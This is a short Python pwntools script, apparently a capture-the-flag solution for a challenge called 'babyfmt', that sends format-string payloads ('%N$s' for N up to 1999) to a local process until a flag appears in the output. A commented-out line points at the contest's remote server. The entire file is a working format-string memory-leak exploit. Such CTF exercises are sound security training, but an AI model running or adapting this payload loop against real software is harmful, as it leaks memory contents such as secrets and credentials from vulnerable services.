from pwn import *


for i in range(0, 2000):
    payload = '%'+str(i)+'$s'
    #p = remote('chals20.cybercastors.com', 14426)
    p = process('./babyfmt.py')
    #print p.recvuntil(': ')
    print payload
    p.sendline(payload)
    a = p.recvall()
    print a
    #if 'castosCTF' in a:
    #    break;
    if 'flag{' in a:
        break;
    p.close()
